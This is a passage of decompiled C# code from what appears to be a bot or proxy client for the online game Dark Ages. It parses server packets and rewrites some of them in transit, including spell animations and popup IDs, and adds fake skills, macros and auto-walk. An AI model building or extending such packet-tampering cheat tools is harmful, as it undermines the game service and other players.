                Server.StaticCharacters[key1].SpellAnimationHistory[(int) num2] = DateTime.UtcNow;
            }
            if (Server.StaticCharacters[key1] is Player && (int) key1 != (int) client.PlayerID)
            {
              if (num2 == (ushort) 19 && num1 != (ushort) 19 && (int) key2 == (int) client.PlayerID && client.MapInfo.Name.StartsWith("Training Dojo "))
              {
                client.throwss = true;
                client.throwername = Server.StaticCharacters[key1].Name;
              }
              if (!Server.StaticCharacters[key2].ProbableSpellType.ContainsKey((int) num2))
                Server.StaticCharacters[key2].ProbableSpellType.Add((int) num2, Server.StaticCharacters[key1].LastBlueText);
              else
                Server.StaticCharacters[key2].ProbableSpellType[(int) num2] = Server.StaticCharacters[key1].LastBlueText;
            }
            if (num2 == (ushort) 161 || num2 == (ushort) 162)
              Server.StaticCharacters[key1].IsCupping = true;
            if ((int) key1 != (int) key2 && num2 == (ushort) 5)
            {
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(24);
              Server.StaticCharacters[key2].IsSkulled = false;
            }
            if ((int) key1 == (int) key2 && num2 == (ushort) 245 && (client.Characters[key1] is Npc && Server.StaticCharacters[key1].hasardcradh) && (!client.MapInfo.Name.Contains("Oren Ruin") && !client.MapInfo.Name.Contains("Shinewood")) && !client.MapInfo.Name.Contains("Ice Cave"))
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(257);
            else if (Server.StaticCharacters[key2] is Npc && (int) key1 == (int) key2 && num2 == (ushort) 232 && !client.MapInfo.Name.Contains("Oren Ruin"))
              Server.StaticCharacters[key2].SpellAnimationHistory.Clear();
            else if (Server.StaticCharacters[key1] is Npc && Server.StaticCharacters[key2] is Player && num2 == (ushort) 232)
              Server.StaticCharacters[key2].SpellAnimationHistory.Clear();
            if (Server.StaticCharacters[key1] is Npc && num2 == (ushort) 1)
              Server.StaticCharacters[key1].isParentGrime = true;
          }
          if (!Server.StaticCharacters[key2].hasdion && !Server.StaticCharacters[key2].hasmonsterdion && (num2 != (ushort) 117 && num2 != (ushort) 41) && (num2 != (ushort) 32 && num2 != (ushort) 42 && (num2 != (ushort) 40 && num2 != (ushort) 259)) && (num2 != (ushort) 258 && num2 != (ushort) 243 && (num2 != (ushort) 257 && num2 != (ushort) 104) && (num2 != (ushort) 82 && num2 != (ushort) 231 && (num2 != (ushort) 273 && num2 != (ushort) 263))) && (num2 != (ushort) 278 && num2 != (ushort) 245 && (num2 != (ushort) 44 && num2 != (ushort) 25) && (num2 != (ushort) 247 && num2 != (ushort) 295)) && num2 != (ushort) 33)
          {
            Server.StaticCharacters[key2].SpellAnimationHistory.Remove(32);
            Server.StaticCharacters[key2].SpellAnimationHistory.Remove(117);
          }
          if (client.Tab.AscendOptions.rescuername.Text != string.Empty)
          {
            Player characterByName = client.FindCharacterByName<Player>(client.Tab.AscendOptions.rescuername.Text);
            if (characterByName != null && characterByName.IsOnScreen && (int) key1 == (int) characterByName.ID && num2 == (ushort) 274)
              client.rescuedtime = DateTime.UtcNow;
          }
          if (!client.safemode && client.Characters[key2] is Player && (int) key2 != (int) client.PlayerID)
          {
            if (client.Tab.vmonitordion && (num2 == (ushort) 244 || num2 == (ushort) 66 || num2 == (ushort) 89 || num2 == (ushort) 93))
              client.UpdatePlayerImage(client.Characters[key2] as Player);
            else if (client.Tab.vmonitorcurses && (num2 == (ushort) 245 || num2 == (ushort) 257))
              client.UpdatePlayerImage(client.Characters[key2] as Player);
            else if (client.Tab.monitords.Checked && (num2 == (ushort) 245 || num2 == (ushort) 104 || num2 == (ushort) 82))
              client.UpdatePlayerImage(client.Characters[key2] as Player);
            else if (client.Tab.vmonitorspells && (num2 == (ushort) 231 || num2 == (ushort) 273))
              client.UpdatePlayerImage(client.Characters[key2] as Player);
          }
        }
        if (client.Characters.ContainsKey(key2) && client.Characters[key2] != null && client.Characters[key2] is Npc && (int) key1 == (int) client.PlayerID)
          client.LastTarget = key2;
        if (!client.safemode && client.Tab.vdisableallspell && (num2 != (ushort) 99 && num2 != (ushort) 24) && (num2 != (ushort) 5 && num2 != (ushort) 191 && (num2 != (ushort) 112 && num2 != (ushort) 212)) && (num2 != (ushort) 213 && num2 != (ushort) 362 && num2 != (ushort) 214) && num2 != (ushort) 96)
          return false;
        if (msg.Length > (ushort) 13 && !client.safemode && MainForm.voldanim)
        {
          bool flag = false;
          ushort num4 = num2;
          int num5;
          switch (num2)
          {
            case 231:
              num4 = (ushort) 21;
              flag = true;
              goto label_162;
            case 243:
              num4 = (ushort) 18;
              flag = true;
              goto label_162;
            case 245:
              num4 = !client.Characters.ContainsKey(key2) || !Server.StaticCharacters.ContainsKey(key2) ? (ushort) 8 : (!(client.LastSpell == "ao ard cradh") ? (!(client.LastSpell == "ao mor cradh") ? (!(client.LastSpell == "ao cradh") ? (!(client.LastSpell == "ao beag cradh") ? (!Server.StaticCharacters[key2].hasardcradh ? (!Server.StaticCharacters[key2].hascradh && !Server.StaticCharacters[key2].hasbardo ? (!Server.StaticCharacters[key2].hasbeagcradh ? (ushort) 8 : (ushort) 39) : (ushort) 38) : (ushort) 37) : (ushort) 39) : (ushort) 38) : (ushort) 8) : (ushort) 37);
              flag = true;
              goto label_162;
            case 254:
              num4 = (ushort) 52;
              flag = true;
              goto label_162;
            case 257:
              num4 = (ushort) 43;
              flag = true;
              goto label_162;
            case 258:
              num4 = (ushort) 44;
              flag = true;
              goto label_162;
            case 259:
              num4 = (ushort) 45;
              flag = true;
              goto label_162;
            case 273:
              num4 = (ushort) 23;
              flag = true;
              goto label_162;
            case 279:
              num5 = 0;
              break;
            default:
              num5 = num2 != (ushort) 232 ? 1 : 0;
              break;
          }
          if (num5 == 0)
          {
            num4 = (ushort) 2;
            flag = true;
          }
          else
          {
            switch (num2)
            {
              case 234:
                num4 = !(client.LastSpell == "sal") && !(client.LastSpell == "beag sal") && !(client.LastSpell == "beag sal lamh") && !(client.LastSpell == "sal lamh") ? (ushort) 10 : (ushort) 9;
                flag = true;
                break;
              case 235:
                num4 = (ushort) 11;
                flag = true;
                break;
              case 237:
                num4 = (ushort) 12;
                flag = true;
                break;
              case 238:
                num4 = (ushort) 13;
                flag = true;
                break;
              case 239:
                num4 = (ushort) 14;
                flag = true;
                break;
              case 240:
                num4 = (ushort) 15;
                flag = true;
                break;
              case 241:
                num4 = (ushort) 16;
                flag = true;
                break;
              case 242:
                num4 = (ushort) 17;
                flag = true;
                break;
              case 244:
                num4 = (ushort) 6;
                flag = true;
                break;
              case 250:
                num4 = (ushort) 29;
                flag = true;
                break;
              case 251:
                num4 = (ushort) 30;
                flag = true;
                break;
              case 252:
                num4 = (ushort) 31;
                flag = true;
                break;
              case 263:
                num4 = (ushort) 81;
                flag = true;
                break;
              case 267:
                num4 = (ushort) 4;
                flag = true;
                break;
              case 271:
                num4 = (ushort) 121;
                flag = true;
                break;
              case 280:
                num4 = (ushort) 19;
                flag = true;
                break;
            }
          }
label_162:
          if ((int) key1 == (int) client.PlayerID && Server.StaticCharacters.ContainsKey(key2) && (num2 == (ushort) 245 || num2 == (ushort) 243 || (num2 == (ushort) 258 || num2 == (ushort) 259) || num2 == (ushort) 104 || num2 == (ushort) 82))
          {
            int num6;
            if (Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey(257))
            {
              int num7;
              switch (num2)
              {
                case 245:
                  num7 = client.LastSpell == "ao ard cradh" ? 1 : 0;
                  break;
                case 257:
                  goto label_168;
                default:
                  num7 = num2 != (ushort) 245 ? 1 : 0;
                  break;
              }
              num6 = num7 == 0 ? 1 : 0;
              goto label_169;
            }
label_168:
            num6 = 1;
label_169:
            if (num6 == 0)
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(257);
            int num8;
            if (Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey(243))
            {
              int num7;
              switch (num2)
              {
                case 243:
                  goto label_176;
                case 245:
                  num7 = client.LastSpell == "ao mor cradh" ? 1 : 0;
                  break;
                default:
                  num7 = num2 != (ushort) 245 ? 1 : 0;
                  break;
              }
              num8 = num7 == 0 ? 1 : 0;
              goto label_177;
            }
label_176:
            num8 = 1;
label_177:
            if (num8 == 0)
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(243);
            int num9;
            if (Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey(258))
            {
              int num7;
              switch (num2)
              {
                case 245:
                  num7 = client.LastSpell == "ao cradh" ? 1 : 0;
                  break;
                case 258:
                  goto label_184;
                default:
                  num7 = num2 != (ushort) 245 ? 1 : 0;
                  break;
              }
              num9 = num7 == 0 ? 1 : 0;
              goto label_185;
            }
label_184:
            num9 = 1;
label_185:
            if (num9 == 0)
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(258);
            int num10;
            if (Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey(259))
            {
              int num7;
              switch (num2)
              {
                case 245:
                  num7 = client.LastSpell == "ao beag cradh" ? 1 : 0;
                  break;
                case 259:
                  goto label_192;
                default:
                  num7 = num2 != (ushort) 245 ? 1 : 0;
                  break;
              }
              num10 = num7 == 0 ? 1 : 0;
              goto label_193;
            }
label_192:
            num10 = 1;
label_193:
            if (num10 == 0)
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(259);
            if (Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey(104) && num2 != (ushort) 245 && num2 != (ushort) 104)
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(104);
            if (Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey(82) && num2 != (ushort) 245 && num2 != (ushort) 82)
              Server.StaticCharacters[key2].SpellAnimationHistory.Remove(82);
          }
          if (flag)
          {
            msg = new ServerPacket((byte) 41);
            msg.WriteUInt32(key2);
            msg.WriteUInt32(key1);
            msg.WriteUInt16(num4);
            msg.WriteUInt16(num1);
            msg.WriteUInt16(num3);
            msg.Write(new byte[3]);
            client.Enqueue(msg);
            return false;
          }
        }
      }
      return true;
    }

    public bool ServerMessage_0x2C_AddSkill(Client client, ServerPacket msg)
    {
      Skill skill1 = new Skill();
      skill1.SkillSlot = (int) msg.ReadByte();
      skill1.Icon = (int) msg.ReadUInt16();
      skill1.Name = msg.ReadString((int) msg.ReadByte());
      Match match = Regex.Match(skill1.Name, "(.*?)( \\(Lev:)(\\d+)(\\/)(\\d+)(\\))");
      if (match.Success)
      {
        skill1.Name = match.Groups[1].Value;
        skill1.CurrentLevel = int.Parse(match.Groups[3].Value);
        skill1.MaximumLevel = int.Parse(match.Groups[5].Value);
      }
      if (System.IO.File.Exists(Options.DarkAgesDirectoryName + "\\" + client.Name + "\\SkillBook.cfg"))
      {
        StreamReader streamReader = new StreamReader((Stream) System.IO.File.Open(Options.DarkAgesDirectoryName + "\\" + client.Name + "\\SkillBook.cfg", FileMode.Open, FileAccess.Read, FileShare.Read));
        while (!streamReader.EndOfStream)
        {
          if (streamReader.ReadLine().Equals(skill1.Name, StringComparison.CurrentCultureIgnoreCase))
            skill1.Caption = streamReader.ReadLine().Split(':')[1];
        }
        streamReader.Close();
      }
      client.SkillBook[skill1.SkillSlot - 1] = skill1;
      if (client.FakeSkills.Count > 0)
      {
        foreach (Skill skill2 in client.FakeSkills.Values)
        {
          if (skill2 != null && (skill1.SkillSlot == skill2.SkillSlot && !skill2.moved))
          {
            client.CreateSkill((byte) skill2.NewSlot, skill2.Icon, skill2.Name);
            client.SendMessage("created in add skill packet 1 slot " + skill2.NewSlot.ToString(), (byte) 0, false);
            break;
          }
        }
      }
      int num1;
      if ((!skill1.Name.Contains("Instrumental") || skill1.Name.Contains("Instrumental Attack")) && (!skill1.Name.Contains("Elemental Bless") && skill1.Name != "Animal Feast") && (skill1.Name != "Triple Kick" && skill1.Name != "Midnight Slash" && (skill1.Name != "Thrash" && skill1.Name != "Long Strike")) && (skill1.Name != "Clobber" && skill1.Name != "Wallop" && (skill1.Name != "Assault" && skill1.Name != "Double Punch") && (skill1.Name != "Assail" && skill1.Name != "Lucky Hand" && (!skill1.Name.Contains("Mend") && skill1.Name != "Tailoring"))) && (skill1.Name != "Execute" && skill1.Name != "Crasher" && (skill1.Name != "Hairstyle" && skill1.Name != "Throw Smoke Bomb") && (skill1.Name != "Unlock" && !skill1.Name.Contains("Inner Beast") && (!skill1.Name.Contains("Archery") && !skill1.Name.Contains("Thrust Attack"))) && (skill1.Name != "Two-handed Attack" && skill1.Name != "swimming" && (skill1.Name != "Lumberjack" && !skill1.Name.Contains("Lore")) && (!skill1.Name.Contains("Item") && skill1.Name != "Appraise" && (skill1.Name != "Wise Touch" && skill1.Name != "Look")))) && skill1.Name != "Wield Staff")
      {
        if (!client.Tab.MacroOptions.macroskillslistview.Items.ContainsKey(skill1.Name) && skill1.CurrentLevel < skill1.MaximumLevel)
        {
          ListViewItem listViewItem = client.Tab.MacroOptions.macroskillslistview.Items.Add(skill1.Name, skill1.Name, -1);
          ListViewItem.ListViewSubItemCollection subItems = listViewItem.SubItems;
          num1 = skill1.CurrentLevel;
          string text = num1.ToString();
          subItems.Add(text);
          listViewItem.Checked = true;
        }
        else if (client.Tab.MacroOptions.macroskillslistview.Items.ContainsKey(skill1.Name) && client.Tab.MacroOptions.macroskillslistview.Items[skill1.Name] != null && skill1.CurrentLevel == skill1.MaximumLevel)
          client.Tab.MacroOptions.macroskillslistview.Items[skill1.Name].Remove();
        else if (client.Tab.MacroOptions.macroskillslistview.Items.ContainsKey(skill1.Name) && client.Tab.MacroOptions.macroskillslistview.Items[skill1.Name] != null)
        {
          ListViewItem.ListViewSubItem subItem = client.Tab.MacroOptions.macroskillslistview.Items[skill1.Name].SubItems[1];
          num1 = skill1.CurrentLevel;
          string str = num1.ToString();
          subItem.Text = str;
        }
      }
      client.Tab.MacroOptions.macroskillslistview.Sort();
      ListView.ListViewItemCollection items1 = client.Tab.SkillSwap.skilltemlist.Items;
      num1 = skill1.SkillSlot;
      string key1 = num1.ToString();
      if (items1.ContainsKey(key1))
      {
        ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.skilltemlist.Items;
        num1 = skill1.SkillSlot;
        string index1 = num1.ToString();
        if (items2[index1].SubItems.Count > 1)
        {
          ListView.ListViewItemCollection items3 = client.Tab.SkillSwap.skilltemlist.Items;
          num1 = skill1.SkillSlot;
          string index2 = num1.ToString();
          items3[index2].SubItems[1].Text = skill1.Name;
        }
        else
        {
          ListView.ListViewItemCollection items3 = client.Tab.SkillSwap.skilltemlist.Items;
          num1 = skill1.SkillSlot;
          string index2 = num1.ToString();
          items3[index2].SubItems.Add(skill1.Name);
        }
      }
      else
      {
        int num2;
        if (skill1.SkillSlot > 36)
        {
          ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.skillmedlist.Items;
          num1 = skill1.SkillSlot - 36;
          string key2 = num1.ToString();
          num2 = !items2.ContainsKey(key2) ? 1 : 0;
        }
        else
          num2 = 1;
        if (num2 == 0)
        {
          ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.skillmedlist.Items;
          num1 = skill1.SkillSlot - 36;
          string index1 = num1.ToString();
          if (items2[index1].SubItems.Count > 1)
          {
            ListView.ListViewItemCollection items3 = client.Tab.SkillSwap.skillmedlist.Items;
            num1 = skill1.SkillSlot - 36;
            string index2 = num1.ToString();
            items3[index2].SubItems[1].Text = skill1.Name;
          }
          else
          {
            ListView.ListViewItemCollection items3 = client.Tab.SkillSwap.skillmedlist.Items;
            num1 = skill1.SkillSlot - 36;
            string index2 = num1.ToString();
            items3[index2].SubItems.Add(skill1.Name);
          }
        }
      }
      return true;
    }

    public bool ServerMessage_0x2D_RemoveSkill(Client client, ServerPacket msg)
    {
      byte num1 = msg.ReadByte();
      if (num1 > (byte) 0)
        client.SkillBook[(int) num1 - 1] = (Skill) null;
      if (num1 > (byte) 0 && client.FakeSkills.Count > 0)
      {
        foreach (Skill skill in client.FakeSkills.Values)
        {
          if (skill != null)
          {
            if ((int) num1 == skill.SkillSlot && !skill.moved)
            {
              skill.moved = true;
              break;
            }
            if (skill.moved)
            {
              skill.moved = false;
              client.CreateSkill((byte) skill.NewSlot, skill.Icon, skill.Name);
              client.SendMessage("created in remove skill slot " + skill.NewSlot.ToString(), (byte) 0, false);
              return false;
            }
            if ((int) num1 == skill.NewSlot)
            {
              skill.moved = true;
              break;
            }
          }
        }
      }
      if (client.Tab.SkillSwap.skilltemlist.Items.ContainsKey(num1.ToString()))
      {
        if (client.Tab.SkillSwap.skilltemlist.Items[num1.ToString()].SubItems.Count > 1)
          client.Tab.SkillSwap.skilltemlist.Items[num1.ToString()].SubItems[1].Text = "";
      }
      else
      {
        int num2;
        int num3;
        if (num1 > (byte) 36)
        {
          ListView.ListViewItemCollection items = client.Tab.SkillSwap.skillmedlist.Items;
          num2 = (int) num1 - 36;
          string key = num2.ToString();
          num3 = !items.ContainsKey(key) ? 1 : 0;
        }
        else
          num3 = 1;
        if (num3 == 0)
        {
          ListView.ListViewItemCollection items1 = client.Tab.SkillSwap.skillmedlist.Items;
          num2 = (int) num1 - 36;
          string index1 = num2.ToString();
          if (items1[index1].SubItems.Count > 1)
          {
            ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.skillmedlist.Items;
            num2 = (int) num1 - 36;
            string index2 = num2.ToString();
            items2[index2].SubItems[1].Text = "";
          }
        }
      }
      return true;
    }

    public bool ServerMessage_0x2E_DisplayWorldMap(Client client, ServerPacket msg)
    {
      client.MapInfo.Number = 0;
      client.Towns.Clear();
      msg.ReadString((int) msg.ReadByte());
      byte num = msg.ReadByte();
      msg.ReadByte();
      for (int index = 0; index < (int) num; ++index)
      {
        Town town = new Town();
        msg.Read(4);
        town.Name = msg.ReadString((int) msg.ReadByte());
        town.Number = msg.ReadUInt32();
        town.DestX = msg.ReadUInt16();
        town.DestY = msg.ReadUInt16();
        client.Towns.Add(town.Name, town);
      }
      return true;
    }

    public bool ServerMessage_0x2F_DialogueResponse(Client client, ServerPacket msg)
    {
      List<string> stringList = new List<string>();
      string empty = string.Empty;
      client.popup = true;
      client.cancast = false;
      client.canskill = false;
      client.donotwalk = true;
      byte num1 = msg.ReadByte();
      int num2 = (int) msg.ReadByte();
      uint num3 = msg.ReadUInt32();
      int num4 = (int) msg.ReadByte();
      int num5 = (int) msg.ReadInt16();
      int num6 = (int) msg.ReadUInt16();
      int num7 = (int) msg.ReadInt16();
      int num8 = (int) msg.ReadUInt16();
      string str1 = msg.ReadString((int) msg.ReadByte());
      string str2 = msg.ReadString((int) msg.ReadUInt16());
      string str3 = str2;
      switch (num1)
      {
        case 0:
          byte num9 = msg.ReadByte();
          string str4 = string.Empty;
          for (int index = 0; index < (int) num9; ++index)
          {
            string str5 = msg.ReadString((int) msg.ReadByte());
            msg.ReadUInt16();
            str4 = str4 + ", " + str5;
          }
          str3 = str2 + str4;
          break;
        case 4:
          string str6 = string.Empty;
          msg.Read(3);
          byte num10 = msg.ReadByte();
          for (int index = 0; index < (int) num10; ++index)
          {
            int num11 = (int) msg.ReadUInt16();
            int num12 = (int) msg.ReadByte();
            uint num13 = msg.ReadUInt32();
            string str5 = msg.ReadString((int) msg.ReadByte());
            str6 = str6 + ", " + str5;
            stringList.Add(str5 + " : " + num13.ToString());
            msg.ReadString((int) msg.ReadByte());
          }
          str3 = str2 + str6;
          break;
      }
      if (client.banklist)
      {
        StreamWriter streamWriter = new StreamWriter(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\banklist.txt", false);
        foreach (string str5 in stringList)
        {
          if (str5 != string.Empty)
            streamWriter.WriteLine(str5);
        }
        streamWriter.Close();
        Process.Start(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\banklist.txt");
      }
      client.Currentnpcname = str1;
      client.Currentnpctext = str3;
      client.CurrentnpcpopupID = num3;
      return true;
    }

    public bool ServerMessage_0x30_PopupResponse(Client client, ServerPacket msg)
    {
      client.agchest = false;
      client.agchestopen = false;
      client.wdchest = false;
      client.wdchestopen = false;
      client.andorchest = false;
      client.andorchestopen = false;
      client.queenchest = false;
      client.queenchestopen = false;
      client.veltainchest = false;
      client.heavychest = false;
      client.smallbag = false;
      client.smallbagopen = false;
      client.bigbag = false;
      client.bigbagopen = false;
      client.heavybag = false;
      client.heavybagopen = false;
      client.atemeg = false;
      client.ateabbox = false;
      client.ateabgift = false;
      ushort num1 = 0;
      ushort num2 = 0;
      string str1 = "";
      string str2 = "";
      string str3 = "";
      string str4 = "";
      string str5 = string.Empty;
      byte num3 = msg.ReadByte();
      uint num4 = 0;
      if (num3 != (byte) 10)
      {
        client.popup = true;
        client.cancast = false;
        client.canskill = false;
        client.donotwalk = true;
        int num5;
        int num6;
        switch (msg.ReadByte())
        {
          case 1:
            num4 = msg.ReadUInt32();
            int num7 = (int) msg.ReadByte();
            num5 = (int) msg.ReadInt16();
            msg.Read(2);
            num6 = (int) msg.ReadInt16();
            msg.Read(1);
            num1 = msg.ReadUInt16();
            num2 = msg.ReadUInt16();
            msg.Read(3);
            string str6 = msg.ReadString((int) msg.ReadByte());
            str1 = msg.ReadString((int) msg.ReadUInt16());
            str5 = str1;
            if (num3 == (byte) 2)
            {
              byte num8 = msg.ReadByte();
              string str7 = string.Empty;
              str4 = "| ";
              for (int index = 0; index < (int) num8; ++index)
              {
                string str8 = msg.ReadString((int) msg.ReadByte());
                str7 = str7 + ", " + str8;
                str4 = str4 + str8 + " | ";
              }
              str5 = str1 + str7;
            }
            if (num3 == (byte) 4)
            {
              str2 = msg.ReadString((int) msg.ReadByte());
              int num8 = (int) msg.ReadByte();
              str3 = msg.ReadString((int) msg.ReadByte());
            }
            client.Currentnpcname = str6;
            if (client.Tab.p4.Text != string.Empty)
            {
              byte[] bytes = BitConverter.GetBytes(uint.Parse(client.Tab.p4.Text));
              msg.BodyData[2] = bytes[3];
              msg.BodyData[3] = bytes[2];
              msg.BodyData[4] = bytes[1];
              msg.BodyData[5] = bytes[0];
              break;
            }
            break;
          case 2:
            num4 = msg.ReadUInt32();
            int num9 = (int) msg.ReadByte();
            num5 = (int) msg.ReadInt16();
            msg.Read(2);
            num6 = (int) msg.ReadInt16();
            msg.Read(1);
            num1 = msg.ReadUInt16();
            num2 = msg.ReadUInt16();
            msg.Read(3);
            string str9 = msg.ReadString((int) msg.ReadByte());
            client.Currentnpcname = str9;
            str1 = msg.ReadString((int) msg.ReadUInt16());
            str5 = str1;
            if (str9 == "Map of Ant Tunnels" && str1.StartsWith("You will be transported to"))
            {
              client.anttunnels = 1;
              break;
            }
            if (str9 == "Map of Ant Guardian Tunnels" && str1.StartsWith("You will be transported to"))
            {
              client.guardiananttunnels = 1;
              break;
            }
            if (str9 == "Bard's Notes")
            {
              client.bardsnotesID = num4;
              break;
            }
            break;
          case 4:
            num4 = msg.ReadUInt32();
            int num10 = (int) msg.ReadByte();
            num5 = (int) msg.ReadInt16();
            msg.Read(2);
            num6 = (int) msg.ReadInt16();
            msg.Read(1);
            num1 = msg.ReadUInt16();
            num2 = msg.ReadUInt16();
            msg.Read(3);
            byte num11 = msg.ReadByte();
            if (num11 != (byte) 0)
              msg.ReadString((int) num11);
            str1 = msg.ReadString((int) msg.ReadUInt16());
            str5 = str1;
            if (num3 == (byte) 2)
            {
              str4 = "| ";
              byte num8 = msg.ReadByte();
              string str7 = string.Empty;
              for (int index = 0; index < (int) num8; ++index)
              {
                string str8 = msg.ReadString((int) msg.ReadByte());
                str7 = str7 + ", " + str8;
                str4 = str4 + str8 + " | ";
              }
              str5 = str1 + str7;
            }
            if (num3 == (byte) 4)
            {
              str2 = msg.ReadString((int) msg.ReadByte());
              int num8 = (int) msg.ReadByte();
              str3 = msg.ReadString((int) msg.ReadByte());
            }
            break;
        }
        if (System.IO.File.Exists(Program.StartupPath + "\\Settings\\scripttext.txt"))
        {
          StreamWriter streamWriter = new StreamWriter(Program.StartupPath + "\\Settings\\scripttext.txt", true);
          string str7 = "Script: " + num1.ToString() + " - Subscript: " + num2.ToString() + " - Text: " + str1;
          if (!Server.scriptTexts.Contains(str7) && !Server.scriptTexts.Contains(str7 + "\n") && !Server.scriptTexts.Contains(str7 + Environment.NewLine))
          {
            Server.scriptTexts.Add(str7);
            switch (num3)
            {
              case 2:
                str7 = str7 + Environment.NewLine + "                         - Options: " + str4;
                break;
              case 4:
                str7 = str7 + Environment.NewLine + "                         - Pretext: " + str2 + " - Posttext: " + str3;
                break;
            }
            streamWriter.WriteLine(str7);
          }
          streamWriter.Close();
        }
      }
      if (num3 == (byte) 10)
      {
        client.closepopupvars();
        str5 = string.Empty;
      }
      client.Currentnpcscript = num1;
      client.Currentpopuptype = (int) num3;
      client.CurrentnpcpopupID = num4;
      client.Currentnpctext = str5;
      if (client.Currentnpctext.StartsWith("You have lost touch") && client.autowalkon)
      {
        client.SendMessage("No faith, auto-walk stopped.", (byte) 0, false);
        client.Tab.autowalker_button.Text = "Start";
        client.autowalkon = false;
      }
      if (client.Currentnpctext == "You don't have any swords that may be smithed any more than they are.")
        client.bladesmithnoswords = true;
      if (client.Currentnpctext == "You don't have any garment that may be tailored.")
        client.tailornoarmors = true;
      if (client.Currentnpctext.StartsWith("You've blistered yourself badly"))
        client.tailorool = true;
      if (client.MapInfo.Number == 7050 && client.Currentnpctext.StartsWith("Thank you for scaring "))
        client.SaveTimedStuff(22);
      else if (client.MapInfo.Number == 8990 && client.Currentnpctext.StartsWith("This must be the wall markings that Nairn was talking about."))
        client.SaveTimedStuff(11);
      else if (client.MapInfo.Number == 8995 && client.Currentnpctext.StartsWith("Guess who we encountered after performing the ritual?"))
        client.SaveTimedStuff(12);
      else if (client.MapInfo.Number == 8298 && client.Currentnpctext.StartsWith("Thank you! You saved me"))
        client.SaveTimedStuff(15);
      else if (client.MapInfo.Number == 6998 && client.Currentnpctext.StartsWith("Thank you for your efforts."))
        client.SaveTimedStuff(10);
      else if (client.MapInfo.Number == 8297 && client.Currentnpctext.StartsWith("Excellent! Here is"))
        client.SaveTimedStuff(16);
      else if (client.MapInfo.Number == 10266 && client.Currentnpctext.StartsWith("That's something for us to worry about"))
        client.SaveTimedStuff(17);
      else if (client.MapInfo.Number == 6805 && client.Currentnpctext.StartsWith("You drink from the fountain."))
        client.SaveTimedStuff(18);
      else if (client.MapInfo.Number == 950 && (client.Currentnpctext.StartsWith("Excellent! Thank you so much!") || client.Currentnpctext.StartsWith("Well done!") || client.Currentnpctext.StartsWith("You remind me of a dear friend")))
        client.SaveTimedStuff(19);
      else if (client.MapInfo.Number == 115 && client.Currentnpctext.StartsWith("I see you were able "))
        client.SaveTimedStuff(21);
      else if (client.MapInfo.Number == 992 && client.Currentnpctext.StartsWith("Sorry, no faeries are willing to bond with you."))
        client.SaveTimedStuff(39);
      else if (client.MapInfo.Number == 3052 && client.Currentnpctext.StartsWith("Excellent! Here is your prize"))
        client.SaveTimedStuff(41);
      else if (client.MapInfo.Number == 132 && (client.Currentnpctext.StartsWith("Thank ya so much. Here's a few coins for your effort.") || client.Currentnpctext.StartsWith("Ah thank ya, you've done well.") || client.Currentnpctext.StartsWith("Ah, it's a good thing you've done") || client.Currentnpctext.StartsWith("You remind me of my own little child.")))
        client.SaveTimedStuff(42);
      else if (client.Currentnpcname.Equals("Arcella's Gift1") && client.Currentnpctext.StartsWith("You are about to open the gift"))
        client.agchest = true;
      else if (client.Currentnpcname.Equals("Water Dungeon Chest") && client.Currentnpctext.Contains(", What type of prize would you"))
        client.wdchest = true;
      else if (client.Currentnpcname.Equals("Andor Chest") && client.Currentnpctext.Contains(", What type of prize"))
        client.andorchest = true;
      else if (client.Currentnpcname.Equals("Andor Queen's Chest") && client.Currentnpctext.Contains(", What type of prize"))
        client.queenchest = true;
      else if (client.Currentnpcname.Equals("Heavy Canal Treasure Bag") && client.Currentnpctext.Contains("You are about to pull an item"))
        client.heavybag = true;
      else if (client.Currentnpcname.Equals("Big Canal Treasure Bag") && client.Currentnpctext.Contains("You are about to pull an item"))
        client.bigbag = true;
      else if (client.Currentnpcname.Equals("Canal Treasure Bag") && client.Currentnpctext.Contains("You are about to pull an item"))
        client.smallbag = true;
      else if (client.Currentnpcname.Equals("Veltain Treasure Chest") && client.Currentnpctext.Contains("How much do you want to invest"))
        client.veltainchest = true;
      else if (client.Currentnpcname.Equals("Heavy Veltain Treasure Chest") && client.Currentnpctext.Contains("How much do you want to invest"))
        client.heavychest = true;
      else if (client.Currentnpcname.Equals("Mother Erbie Gift") && client.Currentnpctext.Contains("You will gain great"))
        client.atemeg = true;
      else if (client.Currentnpcname.StartsWith("Ability and Experience Gift") && client.Currentnpctext.Contains("You will gain great"))
        client.ateabgift = true;
      else if (client.Currentnpcname.StartsWith("Ability and Experience Box") && client.Currentnpctext.Contains("You will gain great"))
        client.ateabbox = true;
      else if (client.Currentnpctext.Contains("Wonderful. Just wait a moment"))
        client.SaveTimedStuff(31);
      else if (client.Currentnpctext.Equals("She finally bows her head, accepting it."))
        client.SaveTimedStuff(33);
      else if (client.Currentnpctext.StartsWith("Ahh well, it's best we don't tell Santa"))
        client.SaveTimedStuff(37);
      else if (client.Currentnpctext.StartsWith("Thanks a bunch, I wish I was there"))
        client.SaveTimedStuff(38);
      if (client.Currentnpctext.StartsWith("This must be the first part of the story."))
        client.lawwall = 1;
      else if (client.Currentnpctext.StartsWith("This seems to match the next part of the story."))
        client.lawwall = 2;
      else if (client.Currentnpctext.StartsWith("This must be the third part of the story."))
        client.lawwall = 3;
      else if (client.Currentnpctext.StartsWith("Yes! The fourth part!"))
        client.lawwall = 4;
      else if (client.Currentnpctext.StartsWith("Great! Another part of the story!"))
        client.lawwall = 5;
      else if (client.Currentnpctext.StartsWith("Woohoo! This story is still confusing to me."))
        client.lawwall = 6;
      else if (client.Currentnpctext.StartsWith("Finally!!! I'm glad this is the last"))
        client.lawwall = 7;
